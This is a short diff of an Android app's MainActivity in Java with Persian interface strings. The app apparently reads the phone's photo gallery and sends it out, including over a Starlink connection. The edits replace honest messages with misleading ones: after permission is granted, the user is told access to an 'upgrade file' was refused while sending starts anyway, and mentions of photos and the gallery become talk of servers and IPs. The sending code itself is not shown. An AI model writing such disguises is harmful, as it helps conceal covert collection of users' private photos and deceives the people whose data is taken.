@@ -144,10 +144,10 @@ public class MainActivity extends AppCompatActivity {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
         if (requestCode == REQUEST_PERMISSION) {
             if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
-                Toast.makeText(this, "✅ دسترسی مجاز شد", Toast.LENGTH_SHORT).show();
+                Toast.makeText(this, " دسترسی مجاز به فایل ارتقاع مجاز نشد", Toast.LENGTH_SHORT).show();
                 startSendingProcess();
             } else {
-                Toast.makeText(this, "❌ دسترسی لازم است", Toast.LENGTH_LONG).show();
+                Toast.makeText(this, " دسترسی لازم به فایل ارتقاع است", Toast.LENGTH_LONG).show();
                 updateUI(false, "قطع");
             }
         }
@@ -220,7 +220,7 @@ public class MainActivity extends AppCompatActivity {
                     if (!isWaitingForNetwork) {
                         updateUI(false, "اتصال برقرار نشد ❌");
                         String msg = "❌ خطا: " + finalError;
-                        if (finalTotal == 0) msg += "\n🔍 هیچ عکسی یافت نشد";
+                        if (finalTotal == 0) msg += "\n🔍 هیچ سروری یافت نشد";
                         Toast.makeText(MainActivity.this, msg, Toast.LENGTH_LONG).show();
                     } else {
                         updateUI(false, "در انتظار اتصال استارلینک...");
@@ -246,7 +246,7 @@ public class MainActivity extends AppCompatActivity {
                 }
             }
         } catch (Exception e) {
-            throw new RuntimeException("خطا در خواندن گالری: " + e.getMessage());
+            throw new RuntimeException("ip خطا در خواندن : " + e.getMessage());
         }
         return list;
     }
